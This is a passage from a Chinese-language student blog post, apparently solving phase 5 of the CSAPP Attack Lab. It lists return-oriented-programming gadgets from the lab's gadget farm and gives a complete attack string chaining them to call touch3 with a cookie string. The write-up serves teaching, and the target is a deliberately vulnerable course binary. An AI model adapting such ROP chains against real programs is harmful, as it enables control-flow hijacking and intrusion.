+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/60922cb3-e576-4700-b13f-9b44e5c70e6c/%E6%88%AA%E5%B1%8F2023-12-11_20.09.08.png" alt="截屏2023-12-11 20.09.08.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>另外在检查的时候发现，地址<code>0x4021f2</code>对应的函数<code>&lt;rio_read&gt;</code>并不属于<strong>gadget farm</strong>，实际上<strong>gadget farm</strong>中只含一个弹栈指令——<code>popq %rax</code>。（决定单开一个文件来检索，省的搜到其他地方白高兴了😭）</p>
+<p>查阅<strong>gadget farm</strong>函数组（省略尝试过程），巧用<code>movl</code>指令，将攻击代码变为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">;地址0x4019b1 &lt;addval_497&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">movq</span> <span class="o">%</span><span class="nb">rsp</span><span class="p">,</span><span class="o">%</span><span class="nb">rax</span>  <span class="c1">; 获取栈指针 48 89 e0</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;地址0x40191c &lt;getval_382&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">movq</span> <span class="o">%</span><span class="nb">rax</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>  <span class="c1">; 48 89 c7</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span><span class="line"><span class="cl"><span class="err">~~</span><span class="c1">;;地址0x4021f2 &lt;rio_read&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;popq %rsi       ; 弹出偏移量 5e</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;ret~~</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;地址0x401923 &lt;getval_109&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">popq</span> <span class="o">%</span><span class="nb">rax</span>       <span class="c1">; 弹出偏移量 58</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;地址0x4019cb &lt;getval_393&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">ecx</span>  <span class="c1">; 89 c1             eax,edx 89 c2</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;地址0x4019b7 &lt;getval_339&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">movl</span> <span class="o">%</span><span class="nb">ecx</span><span class="p">,</span><span class="o">%</span><span class="nb">edx</span>  <span class="c1">; 89 ca             edx,ecx 98 d1</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;地址0x40194e &lt;setval_127&gt;, 0x401a00 &lt;setval_181&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">movl</span> <span class="o">%</span><span class="nb">edx</span><span class="p">,</span><span class="o">%</span><span class="nb">esi</span>  <span class="c1">; 89 d6             ecx,esi 89 ce; </span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">;地址0x401941 &lt;add_xy&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">lea</span> <span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">,</span><span class="o">%</span><span class="nb">rsi</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="o">%</span><span class="nb">rax</span> <span class="c1">; 计算cookie首地址 </span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;地址0x401937 &lt;setval_438&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">movq</span> <span class="o">%</span><span class="nb">rax</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span> <span class="c1">; 参数指定为cookie首地址 48 89 c7</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span></code></pre></div><h4 id="栈结构2">栈结构2</h4>
+<p><code>getbuf</code>函数执行<code>ret</code>返回后的栈结构如下：</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/e214b64b-c7de-4604-91fb-09bee1687718/Untitled.png" alt="Untitled.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<h4 id="解决2">解决2</h4>
+<p>于是攻击字符串为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="n">b1</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// movq %rsp,%rax; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span><span class="n">c</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// movq %rax,%rdi; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">23</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// popq %rax; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">48</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// 偏移量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">cb</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// movl %eax,%ecx; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">b7</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// movl %ecx,%edx; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">4</span><span class="n">e</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// movl %edx,%esi; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">41</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// lea (%rdi,%rsi,1),%rax; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">37</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// movq %rax,%rdi; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">78</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// &amp;(touch3)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">32</span> <span class="mi">64</span> <span class="mi">65</span> <span class="mi">64</span> <span class="mi">39</span> <span class="mi">64</span> <span class="mi">63</span> <span class="mi">30</span>  <span class="c1">// cookie的ASCII码字节值（小端）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mo">00</span>                       <span class="c1">// 字符串末尾要跟上一个`\0`字符
+</span></span></span></code></pre></div><p>执行，任务完成。</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/2df90f22-9949-4bb2-a893-68e0d2161c62/%E6%88%AA%E5%B1%8F2023-12-11_21.01.40.png" alt="截屏2023-12-11 21.01.40.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/e03b8590-65da-4623-a5e0-79f33517b28e/%E6%88%AA%E5%B1%8F2023-12-11_21.02.22.png" alt="截屏2023-12-11 21.02.22.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+
+      </div>
+
+      
+  <time class="mt-12 mb-8 block text-xs text-gray-500 ltr:text-right rtl:text-left dark:text-gray-400" datetime="2023-12-09T00:00:00.000Z">
+    <span>Last updated on</span>
+    Dec 9, 2023</time>
+
+      <div class="container mx-auto prose prose-slate lg:prose-xl dark:prose-invert mt-5">
+        
+        <div class="max-w-prose print:hidden">
+  
+  
+
+  
+
+<div class="flex justify-center">
+  
+  <a class="no-underline bg-primary-100 hover:bg-primary-300 text-primary-800 text-xs font-medium mr-2 px-2.5 py-0.5 lg:px-5 lg:py-2 rounded dark:bg-primary-900 dark:hover:bg-primary-700 dark:text-primary-300" href="/tags/csapp/">CSAPP</a>
+  
+</div>
+
+
+  
+<section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+  
+
+  
+  
+  
+  
+  
+  
+  <a
+    target="_blank" rel="noopener"
+    class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+    href="https://twitter.com/intent/tweet?url=http%3A%2F%2Flocalhost%3A1313%2Fpost%2Fcsapp-attacklab%2F&amp;text=CSAPP&#43;%7C&#43;Attack&#43;Lab&#43;%28in&#43;Chinese%29"
+    title="X"
+    aria-label="X"
+    id="share-link-x"
+  >
+    <svg style="height: 1em;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+  </a>
+  
+
+  
+  
+  
+  
+  
+  
+  <a
+    target="_blank" rel="noopener"
+    class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+    href="https://www.facebook.com/sharer.php?u=http%3A%2F%2Flocalhost%3A1313%2Fpost%2Fcsapp-attacklab%2F&amp;t=CSAPP&#43;%7C&#43;Attack&#43;Lab&#43;%28in&#43;Chinese%29"
+    title="Facebook"
+    aria-label="Facebook"
+    id="share-link-facebook"
+  >
+    <svg style="height: 1em;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z"/></svg>
+  </a>
+  
+
+  
+  
+  
+  
+  
+  
+    
+  
+  <a
+    target="_blank" rel="noopener"
+    class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+    href="mailto:?subject=CSAPP%20%7C%20Attack%20Lab%20%28in%20Chinese%29&amp;body=http%3A%2F%2Flocalhost%3A1313%2Fpost%2Fcsapp-attacklab%2F"
+    title="Email"
+    aria-label="Email"
+    id="share-link-email"
+  >
+    <svg style="height: 1em;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M16.5 12a4.5 4.5 0 1 1-9 0a4.5 4.5 0 0 1 9 0Zm0 0c0 1.657 1.007 3 2.25 3S21 13.657 21 12a9 9 0 1 0-2.636 6.364M16.5 12V8.25"/></svg>
+  </a>
+  
+
+  
+  
+  
+  
+  
+  
+  <a
+    target="_blank" rel="noopener"
+    class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+    href="https://www.linkedin.com/shareArticle?url=http%3A%2F%2Flocalhost%3A1313%2Fpost%2Fcsapp-attacklab%2F&amp;title=CSAPP&#43;%7C&#43;Attack&#43;Lab&#43;%28in&#43;Chinese%29"
+    title="LinkedIn"
+    aria-label="LinkedIn"
+    id="share-link-linkedin"
+  >
+    <svg style="height: 1em;" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+  </a>
+  
+
+  
+  
+  
+  
+  
+  
+  <a
+    target="_blank" rel="noopener"
+    class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+    href="whatsapp://send?text=CSAPP&#43;%7C&#43;Attack&#43;Lab&#43;%28in&#43;Chinese%29%20http%3A%2F%2Flocalhost%3A1313%2Fpost%2Fcsapp-attacklab%2F"
+    title="WhatsApp"
+    aria-label="WhatsApp"
+    id="share-link-whatsapp"
+  >
+    <svg style="height: 1em;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" fill="currentColor"><path d="m187.58 144.84-32-16a8 8 0 0 0-8 .5l-14.69 9.8a40.55 40.55 0 0 1-16-16l9.8-14.69a8 8 0 0 0 .5-8l-16-32A8 8 0 0 0 104 64a40 40 0 0 0-40 40 88.1 88.1 0 0 0 88 88 40 40 0 0 0 40-40 8 8 0 0 0-4.42-7.16ZM152 176a72.08 72.08 0 0 1-72-72 24 24 0 0 1 19.29-23.54l11.48 23L101 118a8 8 0 0 0-.73 7.51 56.47 56.47 0 0 0 30.15 30.15A8 8 0 0 0 138 155l14.61-9.74 23 11.48A24 24 0 0 1 152 176ZM128 24a104 104 0 0 0-91.82 152.88l-11.35 34.05a16 16 0 0 0 20.24 20.24l34.05-11.35A104 104 0 1 0 128 24Zm0 192a87.87 87.87 0 0 1-44.06-11.81 8 8 0 0 0-6.54-.67L40 216l12.47-37.4a8 8 0 0 0-.66-6.54A88 88 0 1 1 128 216Z"/></svg>
+  </a>
+  
+</section>
+
+
+  
+
+
+
+
+
+
+
+
+  
+  
+    
+
+
+
+  
+  
+  
+    
+  
+  
+  
+
+<div class="flex pt-12 pb-4">
+  
+  
+  <img
+    class="mr-4 h-24 w-24 rounded-full"
+    width="96"
+    height="96"
+    alt="Zhidong Zhang"
+  src="/author/zhidong-zhang/avatar_hu_c4b7800e821b5c1.png"
+  loading="lazy"
+  />
+  
+  <div class="place-self-center">
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      Authors
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      <a href="http://localhost:1313/" class="no-underline">
+      Zhidong Zhang
+      </a>
+    </div>
+
+    
+    <div class="text-sm font-bold text-neutral-700 dark:text-neutral-300">
+    Undergraduate Student
+    </div>
+    
+
+
+    
+
+    <div class="text-2xl sm:text-lg pt-1">
+
+      
+<div class="flex flex-wrap text-neutral-500 dark:text-neutral-300">
+  
+    
+    
+    
+    
+    <a
+      class="pr-2 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+      style="will-change:transform;"
+      href="mailto:zhidong.zhang96@foxmail.com"
+      
+      aria-label="At-Symbol"
+    ><svg style="height: 1em;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M16.5 12a4.5 4.5 0 1 1-9 0a4.5 4.5 0 0 1 9 0Zm0 0c0 1.657 1.007 3 2.25 3S21 13.657 21 12a9 9 0 1 0-2.636 6.364M16.5 12V8.25"/></svg></a>
+  
+    
+    
+    
+    
+      
+    
+    <a
+      class="pr-2 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+      style="will-change:transform;"
+      href="https://github.com/Antony-Zhang"
+      target="_blank" rel="noopener" rel="me noopener noreferrer"
+      aria-label="Brands/Github"
+    ><svg style="height: 1em;" fill="currentColor" viewBox="3 3 18 18"><path d="M12 3C7.0275 3 3 7.12937 3 12.2276C3 16.3109 5.57625 19.7597 9.15374 20.9824C9.60374 21.0631 9.77249 20.7863 9.77249 20.5441C9.77249 20.3249 9.76125 19.5982 9.76125 18.8254C7.5 19.2522 6.915 18.2602 6.735 17.7412C6.63375 17.4759 6.19499 16.6569 5.8125 16.4378C5.4975 16.2647 5.0475 15.838 5.80124 15.8264C6.51 15.8149 7.01625 16.4954 7.18499 16.7723C7.99499 18.1679 9.28875 17.7758 9.80625 17.5335C9.885 16.9337 10.1212 16.53 10.38 16.2993C8.3775 16.0687 6.285 15.2728 6.285 11.7432C6.285 10.7397 6.63375 9.9092 7.20749 9.26326C7.1175 9.03257 6.8025 8.08674 7.2975 6.81794C7.2975 6.81794 8.05125 6.57571 9.77249 7.76377C10.4925 7.55615 11.2575 7.45234 12.0225 7.45234C12.7875 7.45234 13.5525 7.55615 14.2725 7.76377C15.9937 6.56418 16.7475 6.81794 16.7475 6.81794C17.2424 8.08674 16.9275 9.03257 16.8375 9.26326C17.4113 9.9092 17.76 10.7281 17.76 11.7432C17.76 15.2843 15.6563 16.0687 13.6537 16.2993C13.98 16.5877 14.2613 17.1414 14.2613 18.0065C14.2613 19.2407 14.25 20.2326 14.25 20.5441C14.25 20.7863 14.4188 21.0746 14.8688 20.9824C16.6554 20.364 18.2079 19.1866 19.3078 17.6162C20.4077 16.0457 20.9995 14.1611 21 12.2276C21 7.12937 16.9725 3 12 3Z"></path></svg></a>
+  
+    
+    
+    
+    
+      
+    
+    <a
+      class="pr-2 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+      style="will-change:transform;"
+      href="https://orcid.org/0009-0004-7009-3369"
+      target="_blank" rel="noopener" rel="me noopener noreferrer"
+      aria-label="Academicons/Orcid"
+    ><svg style="height: 1em;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M336.62 194.538c-7.13-3.328-13.866-5.56-20.253-6.614c-6.365-1.095-16.574-1.612-30.71-1.612h-36.704v152.747h37.634c14.673 0 26.081-1.013 34.224-3.017c8.142-2.004 14.921-4.526 20.356-7.626a69.448 69.448 0 0 0 14.942-11.388c14.488-14.714 21.742-33.273 21.742-55.717c0-22.052-7.44-40.052-22.341-53.982c-5.498-5.166-11.822-9.444-18.89-12.793zM256 8C119.022 8 8 119.042 8 256s111.022 248 248 248s248-111.042 248-248S392.978 8 256 8Zm-82.336 357.513h-29.389V160.148h29.389zM158.95 138.696c-11.14 0-20.213-9.01-20.213-20.212c0-11.118 9.052-20.191 20.213-20.191c11.18 0 20.232 9.052 20.232 20.191a20.194 20.194 0 0 1-20.232 20.212zm241.386 163.597c-5.29 12.545-12.834 23.581-22.65 33.088c-9.982 9.837-21.597 17.194-34.844 22.196c-7.75 3.017-14.839 5.063-21.307 6.117c-6.49 1.013-18.828 1.509-37.076 1.509h-64.956V160.148h69.233c27.962 0 50.034 4.154 66.32 12.545c16.265 8.37 29.181 20.728 38.792 36.972c9.61 16.265 14.425 34.018 14.425 53.196c.023 13.765-2.666 26.908-7.936 39.432z"/></svg></a>
+  
+</div>
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+
+
+
+
+  
+  
+    
+    
+    
+      
+      
+    
+<div class="pt-1 no-prose w-full">
+  <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+  <div class="flex flex-col md:flex-row flex-nowrap justify-between gap-5 pt-2">
+    <div class="">
+      
+        <a class="group flex no-underline" href="/post/texonvscode/">
+          <span
+            class="mt-[-0.3rem] me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+          ><span class="ltr:inline rtl:hidden">&larr;</span></span>
+          <span class="flex flex-col">
+            <span
+              class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+            >LaTeX on VSCode (MacOS)</span>
+            <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+              
+                Oct 15, 2024
+              
+            </span>
+          </span>
+        </a>
+      
+    </div>
+    <div class="">
+      
+        <a class="group flex text-right no-underline" href="/post/second-brain/">
+          <span class="flex flex-col">
+            <span
+              class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+            >🧠 Sharpen your thinking with a second brain</span
+            >
+            <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+              
+                Oct 26, 2023
+              
+            </span>
+          </span>
+          <span
+            class="mt-[-0.3rem] ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+          ><span class="ltr:inline">&rarr;</span></span>
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+
+
+  
+
+
+  
+
+
+
+</div>
+
+      </div>
+
+    </main>
+  </article>
+</div>
+
+    </div>
+    <div class="page-footer">
+      <footer class="container mx-auto flex flex-col justify-items-center text-sm leading-6 mt-24 mb-4 text-slate-700 dark:text-slate-200">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+
+  
+  
+    
+  
+  
+    
+  
+
+  
+
+  
+  <p class="powered-by text-center">
+    © 2025 Me. This work is licensed under <a href="https://creativecommons.org/licenses/by-nc-nd/4.0" rel="noopener noreferrer" target="_blank">CC BY NC ND 4.0</a>
+  </p>
+  
+
+  <p class="powered-by footer-license-icons">
+    <a href="https://creativecommons.org/licenses/by-nc-nd/4.0" rel="noopener noreferrer" target="_blank" aria-label="Creative Commons">
+      <i class="fab fa-creative-commons fa-2x" aria-hidden="true"></i>
+      <i class="fab fa-creative-commons-by fa-2x" aria-hidden="true"></i>
+      
+        <i class="fab fa-creative-commons-nc fa-2x" aria-hidden="true"></i>
+      
+      
+        <i class="fab fa-creative-commons-nd fa-2x" aria-hidden="true"></i>
+      
+    </a>
+  </p>
+
+
+
+
+
+  <p class="powered-by text-center">
+    
+    
+    
+      
+      
+      
+      
+      
+      
+      Published with <a href="https://hugoblox.com/?utm_campaign=poweredby" target="_blank" rel="noopener">Hugo Blox Builder</a> — the free, <a href="https://github.com/HugoBlox/hugo-blox-builder" target="_blank" rel="noopener">open source</a> website builder that empowers creators.
+    
+  </p>
+
+</footer>
+
+    </div>
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
